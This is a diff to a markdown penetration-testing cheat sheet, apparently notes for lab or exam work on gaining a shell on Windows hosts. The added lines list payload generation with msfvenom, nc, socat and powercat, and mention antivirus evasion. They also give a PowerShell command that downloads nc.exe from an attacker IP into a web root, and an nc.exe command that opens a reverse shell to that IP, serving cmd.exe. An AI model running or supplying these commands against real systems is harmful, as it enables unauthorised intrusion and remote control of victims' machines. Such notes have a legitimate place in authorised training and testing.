@@ -2,7 +2,8 @@
 Remember to check for AV before uploading common payloads! 
 - [ ] Can you exec .NET commands or Powershell as well? 
 - [ ] Web Shells 
-- [ ] Reverse Shell Commands 
+- [ ] Generate a payload - msfvenom or use nc/socat/powercat
+- [ ] Upload payload and invoke 
 - [ ] Antivirus evasion 
 
 ## Test Connection with ping  
@@ -17,10 +18,18 @@ Remember to check for AV before uploading common payloads!
 [ConPty shell](https://github.com/antonioCoco/ConPtyShell)  
 
 ## Reverse Shell Commands 
+Most likely you will need an exe payload as other payloads aren't usually stable / powershell Execution-Policy is often restricted. 
+Generate exe with msfvenom, upload nc, socat, powercat. Find upload point / code execution point to download and execute. 
+
+### File Transfers 
+Upload pages, certutil, powershell
+
+    powershell Invoke-WebRequest -Uri http://192.168.119.149:8888/nc.exe -OutFile C:\xampp\htdocs\nc.exe  
 ### Netcat
-upload static binary 
+upload static binary nc.exe and invoke 
 
 
+    nc.exe -nv 192.168.119.149 53 -e C:\WINDOWS\system32\cmd.exe 
 
 ### Powershell 
 [Powershell reverse shell scripts](https://github.com/ivan-sincek/powershell-reverse-tcp)  
